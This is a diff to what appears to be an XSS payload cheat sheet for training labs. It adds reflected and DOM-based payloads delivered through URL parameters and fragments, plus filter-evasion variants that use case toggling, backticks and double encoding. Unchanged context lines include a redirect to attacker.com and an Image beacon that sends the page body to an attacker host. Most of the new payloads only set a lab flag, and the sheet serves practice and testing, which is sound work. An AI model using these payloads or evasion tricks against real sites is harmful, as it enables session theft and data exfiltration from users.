@@ -55,6 +55,23 @@ Binary-search on N (start ~77 for 'M', adjust up/down).
 <img src=x onerror="window.location='http://attacker.com'">
 ```
 
+### Reflected — lab proof payloads (window.labSolved=true)
+```
+URL parameter delivery:
+  https://target.com/search?q=<img src=x onerror="window.labSolved=true">
+  https://target.com/search?q=%3Cimg%20src%3Dx%20onerror%3D%22window.labSolved%3Dtrue%22%3E
+  https://target.com/search?q=<svg onload="window.labSolved=true">
+  https://target.com/search?q=<body onload="window.labSolved=true">
+  https://target.com/search?q=<input onfocus="window.labSolved=true" autofocus>
+
+Filter evasion (if basic payloads blocked):
+  https://target.com/search?q=<ImG src=x onerror="window.labSolved=true">  # case toggle
+  https://target.com/search?q=<img src=x onerror=window.labSolved`true`>  # backtick
+  https://target.com/search?q=%253Cimg%2520src%253Dx%2520onerror%253D%2522window.labSolved%253Dtrue%2522%253E  # double-encoded
+  
+Testing: click link → DevTools Console → type: window.labSolved (returns true if XSS works)
+```
+
 ### Stored — proof payloads
 ```
 <img src=x onerror="window.labSolved=true">
@@ -62,10 +79,35 @@ Binary-search on N (start ~77 for 'M', adjust up/down).
 <img src=x onerror="new Image().src='http://attacker/?data='+document.body.innerHTML">
 ```
 
-### DOM-based
+### DOM-based — via URL fragment (#)
 ```
-https://target/page#<img src=x onerror=alert(1)>
-https://target/page#%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E  # URL-encoded
+Basic:
+  https://target/page#<img src=x onerror=alert(1)>
+  https://target/page#<svg onload=alert(1)>
+  https://target/page#<body onload=alert(1)>
+  https://target/page#%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E  # URL-encoded
+
+Lab proof (window.labSolved=true):
+  https://target/page#<img src=x onerror="window.labSolved=true">
+  https://target/page#%3Cimg%20src%3Dx%20onerror%3D%22window.labSolved%3Dtrue%22%3E  # URL-encoded
+  https://target/page#<svg onload="window.labSolved=true">
+  https://target/page#<input onfocus="window.labSolved=true" autofocus>
+
+Filter evasion:
+  https://target/page#<ImG src=x onerror="window.labSolved=true">  # case toggle
+  https://target/page#<img src=x onerror=window.labSolved`true`>  # backtick
+  https://target/page#%253Cimg%2520src%253Dx%2520onerror%253D%2522window.labSolved%253Dtrue%2522%253E  # double-encoded
+
+Testing: visit URL → DevTools Console → type: window.labSolved (returns true if DOM XSS works)
+```
+
+### DOM-based — via URL query (?)
+```
+https://target/page?msg=<img src=x onerror="window.labSolved=true">
+https://target/page?ref=<svg onload="window.labSolved=true">
+https://target/page?search=%3Cimg%20src%3Dx%20onerror%3D%22window.labSolved%3Dtrue%22%3E
+
+Note: Only works if page reads location.search or document.referrer (not location.hash)
 ```
 
 ### Filter evasion
